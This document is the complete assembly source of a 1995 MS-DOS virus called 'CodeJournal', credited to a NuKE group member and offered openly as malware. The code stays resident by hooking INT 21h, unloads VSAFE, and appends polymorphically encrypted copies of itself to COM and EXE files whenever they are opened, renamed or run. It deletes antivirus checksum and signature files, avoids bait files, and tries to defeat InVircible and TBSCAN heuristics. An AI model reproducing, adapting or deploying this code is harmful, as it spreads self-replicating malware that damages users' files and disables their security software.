;
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; CodeJournal virus, (c)1995 ûirogen [NuKE]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;
; Polymorphic, Resident, Parastic EXE/COM Fast Infector. This is
; another one of my fuck-Invircible viruses. It uses absolutly
; no stealth techniques, yet successfully piggybacks invircible.
;
; Anti-Invircible Code
; ----------------------
;  Completly defeats InVircible's v6.02 Anti-Piggybacking
;  Avoids Bait Files
;  Doesn't infect InVircible executables
;  Deletes Invircible v6.02 signature files no matter what name they have
;   Searches for and deletes them on set dir (21h/3Bh) call
;
; The Rest
; ----------------------
;  Polymorphism is ûiCE v0.5
;  Infects on: Open (3Dh), Rename (56h), Ext. Open (6Ch), Execute (4Bh)
;  Doesn't infect executables ending in 'AN', 'OT', 'AV', 'NU', or 'ND'.
;  Attempts to get DOS 21h vector by assuming offset is 109Eh in DOS seg.
;  Deletes all signature/recovery files known to man
;  TBSCAN doesn't flag COM files at all because of my patented JMP construct
;  Only subtracts from total memory when DOS allocate memory (49h) is called
;  ..and then the usual shit..
;
;
;
;
cseg        segment
            assume  cs: cseg, ds: cseg, es: cseg, ss: cseg

signal      equ     063ABh
buf_size    equ     850
vice_size   equ     1993+buf_size
virus_size  equ     (offset vend-offset start)+VICE_SIZE
max_iv_size equ     256*66                  ; maximum size a signature file
                                            ; can be, speeds up search.
                                            ; can't contain more than 256
                                            ; records
extrn       _vice:  near

org         0h
start:
            call    get_bp                  ; get relative offset
nx:
            push    ds es                   ; save segments for EXE

            inc     si                      ; SI!=0
            mov     ax,signal
            int     21h
            or      si,si
            jz      no_install

            mov     dx,5945h                ; remove VSAFE from memory
            mov     ax,3D02h
            add     ax,0FA01h-3D02h
            int     21h

            mov     cs:int_busy[bp],0       ; reset interrupt busy flag

            mov     ax,ds                   ; PSP segment
            dec     ax                      ; mcb below PSP m0n
            mov     ds,ax                   ; DS=MCB seg
            mov     al,'Z'+1                ; fuck heuristics
            dec     al
            cmp     byte ptr ds: [0],al     ; Is this the last MCB in chain?
            jnz     no_install
            sub     word ptr ds: [3],((virus_size+1023)/1024)*64*2 ; alloc MCB
            sub     word ptr ds: [12h],((virus_size+1023)/1024)*64*2 ; alloc PSP
            mov     es,word ptr ds: [12h]   ; get high mem seg

            push    cs
            pop     ds
            mov     si,bp
            mov     cx,virus_size/2+1
            xor     di,di
            rep     movsw                   ; copy code to new seg

            xor     ax,ax
            mov     ds,ax                   ; null ds
            push    ds
            lds     ax,ds: [21h*4]          ; get 21h vector
            mov     es: word ptr old21+2,ds ; save S:O
            mov     es: word ptr old21,ax
            pop     ds
            mov     ds: [21h*4+2],es        ; new int 21h seg
            mov     ds: [21h*4],offset new21 ; new offset

no_install:

            pop     es ds                   ; restore ES DS
            xor     ax,ax                   ; null regs
            xor     bx,bx
            xor     dx,dx
            cmp     cs: is_exe[bp],1
            jz      exe_return

            lea     si,org_bytes[bp]        ; com return
            mov     di,0100h                ; -restore first bytes
            mov     cx,3
            rep     movsb

            xor     di,di
            xor     si,si
            mov     cx,100h                 ; jump back to 100h
            push    cx
_ret:       ret

exe_return:
            xor     di,di
            xor     si,si
            mov     cx,ds                   ; calc. real CS
            add     cx,10h
            add     word ptr cs: [exe_jump+2+bp],cx
            cli
            add     cx,cs:orgss[bp]         ; calc. real SS
            mov     ss,cx
            mov     sp,cs:orgsp[bp]         ; restore SP
            sti
            int     3                       ; fix prefetch
            db      0eah
exe_jump    dd      0
is_exe      db      0

get_bp:
            int     3
            pop     bp
            push    bp
            sub     bp,offset nx
            ret


; resident infection function

infect_file:
            cmp     ah,6ch+1                ; from extended open?
            jnz     not_extended
            mov     dx,si
not_extended:
            mov     di,dx

            mov     al,'.'
            mov     cx,0FFh
            repnz   scasb
            or      cx,cx
            jnz     got_ext
            ret
got_ext:
            cmp     word ptr [di],'oc'
            jz      is_exec
            cmp     word ptr [di],'OC'
            jz      is_exec
            cmp     word ptr [di],'xe'
            jz      is_exec
            cmp     word ptr [di],'XE'
            jz      is_exec
is_bad:
            ret
is_exec:
            cmp     word ptr [di-3],'DN'    ; *ND
            jz      is_bad
            cmp     word ptr [di-3],'NA'    ; *AN
            jz      is_bad
            cmp     word ptr [di-3],'VA'    ; *AV
            jz      is_bad
            cmp     word ptr [di-3],'TO'    ; *OT
            jz      is_bad
            cmp     word ptr [di-3],'UN'    ; *NU
            jz      is_bad

            push    ds
            xor     ax,ax
            mov     es,ax
            lds     ax,es: [24h*4]
            mov     cs: save24ip,ax         ; save 24h
            mov     cs: save24cs,ds
            lds     ax,es: [21h*4]
            mov     cs: save21ip,ax         ; save 21h
            mov     cs: save21cs,ds
            mov     es: [24h*4+2],cs        ; write new 24h
            mov     es: [24h*4],offset new_24
            push    es
            mov     ah,52h                  ; get DOS segment
            int     21h
            pop     ds
            mov     si,109Eh                ; assume 109Eh
            cmp     es: [si],09090h         ; is DOS vecor?
            jnz     not_dos
            mov     ds: [21h*4],si          ; write new 21h
            mov     ds: [21h*4+2],es

            not_dos:

            pop     ds
            push    cs
            pop     es

            mov     al,0                    ; get phile attribute
            call    attrib_file
            push    cx                      ; save CX-attrib

            mov     al,1                    ; null attribs
            xor     cx,cx
            call    attrib_file

            mov     al,2
            call    open_file
            jc      dont_do

            push    cs
            pop     ds

            mov     cx,1ah
            lea     dx,org_bytes
            call    read_file

            mov     al,0                    ; get time/date
            call    date_file
            push    cx dx

            cmp     byte ptr org_bytes,'M'
            jz      do_exe
            cmp     byte ptr org_bytes,90h  ; InVircible bait?
            jz      close
            cmp     byte ptr org_bytes,0E9h ; us? / invircible bait?
            jz      close

            mov     is_exe,0

            call    offset_end
            cmp     ax,0FFFFh-virus_size    ; file too big?
            ja      close
            push    ax                      ; AX=end of file

            lea     si,start                ; DS:SI=start of code to encrypt
            mov     di,virus_size           ; ES:DI=address for decryptor/
            push    di                      ;       encrypted code. (at heap)
            mov     cx,virus_size           ; CX=virus size
            mov     dx,ax                   ; DX=EOF offset
            add     dx,100h                 ; DX=offset decryptor will run from
            mov     al,00000011b            ; garbage, no CS:
            call    _vice                   ; call engine!

            pop     dx
            call    write_file

            call    offset_zero
            pop     ax                      ; restore COM file size
            sub     ax,3                    ; calculate jmp offset
            mov     word ptr new_jmp+1,ax

            lea     dx,new_jmp
            mov     cx,3
            call    write_file

close:
            pop     dx cx                   ; pop date/time
            mov     al,01                   ; restore the mother fuckers
            call    date_file

dont_do:
            pop     cx                      ; restore attrib
            mov     al,1
            call    attrib_file

            call    close_file

            xor     ax,ax
            mov     es,ax
            lds     ax,dword ptr cs: save24ip ; restore shitty DOS error handler
            mov     es: [24h*4],ax
            mov     es: [24h*4+2],ds
            lds     ax,dword ptr cs: save21ip
            mov     es: [21h*4],ax
            mov     es: [21h*4+2],ds
            ret

do_exe:

            cmp     word ptr exe_header[12h],0 ; is checksum (in hdr) 0?
            jnz     close                   ; could be iv bait if not
            cmp     byte ptr exe_header[18h],52h ; pklite'd?
            jz      exe_ok
            cmp     byte ptr exe_header[18h],40h ; don't infect new format exe
            jge     close
            mov     ax,word ptr exe_header[0Ah]   ; get minimum memory
            cmp     word ptr exe_header[0Ch],ax   ; if max mem=min mem then ok
            jz      exe_ok
            cmp     byte ptr exe_header[0Ch],0FFh ; max memory FFFFh?
            jnz     close
exe_ok:
            push    bx

            mov     ah,2ch                  ; grab a random number
            int     21h
            mov     word ptr exe_header[12h],dx ; mark that it's us
            mov     is_exe,1

            les     ax,dword ptr exe_header[0eh] ; get old SS:SP
            mov     word ptr orgss,ax            ; not reversed
            mov     word ptr orgsp,es

            les     ax,dword ptr exe_header[14h] ; Save old entry point
            mov     word ptr exe_jump, ax
            mov     word ptr exe_jump+2, es

            push    cs
            pop     es

            call    offset_end

            mov     cx,10h                  ; divide by 16
            div     cx
            sub     ax, word ptr exe_header[8] ; subtract header size

            mov     word ptr exe_header[14h],dx ; new cs:ip
            mov     word ptr exe_header[16h],ax

            inc     ax
            mov     word ptr exe_header[0eh],ax     ; new SS
            mov     word ptr exe_header[10h],0F000h  ; new SP

            lea     si,start                ; DS:SI=start of code to encrypt
            mov     di,virus_size           ; ES:DI=address for decryptor & code
            mov     cx,virus_size           ; CX=virus size
            mov     al,00000010b            ; garbage, use CS:
            call    _vice                   ; call engine!

            pop     bx                      ; pop handle
            mov     dx,virus_size
            call    write_file              ; append virus
            call    offset_end              ; get adjusted file size

            mov     cx,512                  ; divide by 512
            div     cx
            inc     ax                      ; add a page

            mov     word ptr exe_header+4,ax ; save new size
            mov     word ptr exe_header+2,dx

            call    offset_zero

            mov     cx,18h                  ; write fiXed header
            lea     dx,exe_header
            call    write_file

            jmp     close

offset_zero:
            xor     al,al
            jmp     set_fp
offset_end:
            mov     al,02h
set_fp:
            mov     ah,42h
            xor     cx,cx
            xor     dx,dx
            int     21h
            ret

open_file:
            mov     ah,3dh
            int     21h
            xchg    ax,bx
            ret

close_file:
            mov     ah,3eh
            int     21h
            ret

read_file:
            mov     ah,3fh
            int     21h
            ret

write_file:
            mov     ah,40h
            int     21h
            ret

attrib_file:
            mov     ah,43h
            int     21h
            ret

date_file:
            mov     ah,56h
            int     21h
            ret

new21:
            pushf
            cmp     ax,signal               ; be it us?
            jnz     nchk                    ; richtig..
            xor     si,si
            popf
            iret
nchk:
            cmp     cs:int_busy,1           ; are we already in int?
            jz      jmp_no_stack
            mov     cs:int_busy,1           ; now we are

            inc     ah                      ; fuck heuristics
            cmp     cs: fix_mem,1           ; need to fix memory?
            jz      add_mem
            cmp     ah,48h+1                ; allocate memory?
            jz      sub_mem
            cmp     ah,3Bh+1                ; set dir?
            jz      kill_anti_virus
            cmp     ah,4bh+1                ; execute phile?
            jz      go_infect
            cmp     ah,3dh+1                ; open phile?
            jz      go_infect
            cmp     ah,6ch+1                ; extended open?
            jz      go_infect
            cmp     ah,56h+1                ; rename/move phile?
            jnz     jmp_org

go_infect:
            call    push_regs
            call    infect_file
            call    pop_regs
jmp_org:
            dec     cs:int_busy             ; not busy anymore
            dec     ah                      ; restore function

jmp_no_stack:
            popf
            db      0eah                    ; jump far XXXX:XXXX
            old21   dd 0

si_jmp_org:
            pop     si
            jmp     jmp_org


add_mem:
            mov     cs: fix_mem,0
            push    ax ds
            xor     ax,ax
            mov     ds,ax
            add     byte ptr ds: [413h],((virus_size+1023)*2)/1024 ;+totalmem
            pop     ds ax
            jmp     jmp_org
sub_mem:
            mov     cs: fix_mem,1
            push    ax ds
            xor     ax,ax
            mov     ds,ax
            sub     byte ptr ds: [413h],((virus_size+1023)*2)/1024 ;-totalmem
            pop     ds ax
            jmp     jmp_org

kill_anti_virus:
            call    push_regs
            push    cs
            pop     ds
            mov     ah,2fh                  ; get DTA
            int     21h
            push    bx es                   ; save DTA
            push    cs
            pop     es
            lea     dx,ff_info
            call    set_dta
            mov     cx,16h                  ; include all attribs
            lea     dx,inv_spec
            mov     ah,4eh
            int     21h                     ; findfirst
            jnc     inv_loop
            jmp     inv_done
inv_loop:
            lea     si,f_name
            push    si
            mov     dx,si
            cmp     word ptr [si+4],'V-'    ; ANTI-VIR.DAT?
            jz      is_anti
            cmp     word ptr [si+8],'SM'    ; CHKLIST.MS?
            jz      is_anti
            cmp     word ptr [si+8],'PC'    ; CHKLIST.CPS?
            jz      is_anti
            cmp     f_sizeh,0               ; high word set?
            jnz     findnext
            cmp     f_sizel,max_iv_size     ; too big?
            jg      findnext
            mov     al,0
            call    open_file
            jc      findnext
            mov     byte ptr inv_buf,0
            mov     cx,44h
            lea     dx,inv_buf
            call    read_file
            cmp     ax,44h
            jz      record_s
            mov     ax,word ptr inv_buf
            mov     word ptr inv_buf[42h],ax
record_s:
            call    close_file
            lea     si,inv_buf
            call    chk_iv                  ; check first record
            jnz     findnext
            lea     si,inv_buf[42h]
            call    chk_iv                  ; check second record
            jnz     findnext
is_anti:
            mov     al,1                    ; reset attribs
            xor     cx,cx
            call    attrib_file
            mov     ah,41h
            lea     dx,f_name
            int     21h
findnext:
            mov     al,0                    ; null out filename
            pop     di                      ; di-> fname
            mov     cl,13
            rep     stosb
            mov     ah,4fh
            int     21h
            jc      inv_done
            jmp     inv_loop
inv_done:
            pop     ds dx                   ; restore DTA
            call    set_dta
no_kill:
            call    pop_regs
            jmp     jmp_org

set_dta:
            mov     ah,1ah
            int     21h
            ret

chk_iv:
            cmp word ptr [si],'ZM'
            jz yea_iv
            cmp word ptr [si],'KP'
            jz yea_iv
            cmp word ptr [si],0EA60h
yea_iv:
            ret

push_regs:
            mov cs:_bp,bp
            pop bp
            push ax bx cx di dx si ds es
            push bp
            ret

pop_regs:
            pop bp
            pop es ds si dx di cx bx ax
            push bp
            mov bp,cs:_bp
            ret

new_24:                                     ; critical error handler
            mov     al,3                    ; prompts suck, return fail
            iret


inv_spec    db      '*.*',0
credits     db      'CodeJournal by ûirogen [NuKE]'
orgss       dw      0                       ; original SS:SP in exe
orgsp       dw      0                       ;
fix_mem     db      0
new_jmp     db      0E9h,0,0                ; jmp XXXX
rel_off     dw      0
exe_header:
org_bytes   db      0CDh,20h, 6 dup (0)     ; original COM bytes | exe hdr
vend:
            db      13h dup(0)              ; remaining exe header space
save21ip    dw      0                       ; infected int21h vector
save21cs    dw      0
save24ip    dw      0                       ; old int24h vector
save24cs    dw      0
_bp         dw      0
int_busy    db      0
ff_info     db      26 dup(0)
f_sizel     dw      0
f_sizeh     dw      0
f_name      db      13 dup(0)
inv_buf     db      44h dup (0)
cseg        ends
            end     start

